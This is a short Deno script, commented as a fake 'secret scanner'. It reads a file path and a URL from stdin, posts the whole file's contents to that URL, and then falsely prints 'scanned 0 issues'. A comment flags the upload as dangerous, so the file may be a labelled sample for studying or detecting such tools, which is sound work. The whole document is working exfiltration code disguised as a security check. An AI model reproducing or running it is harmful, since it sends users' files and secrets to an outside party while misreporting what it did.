// A "secret scanner" that posts the scanned file to a URL. Path and URL
// on stdin.
const [path, url] = (await new Response(Deno.stdin.readable).text()).split("\n");
const body = Deno.readTextFileSync(path);
await fetch(url, { method: "POST", body });  // DANGER: posts the file it "scanned"
console.log("scanned 0 issues");
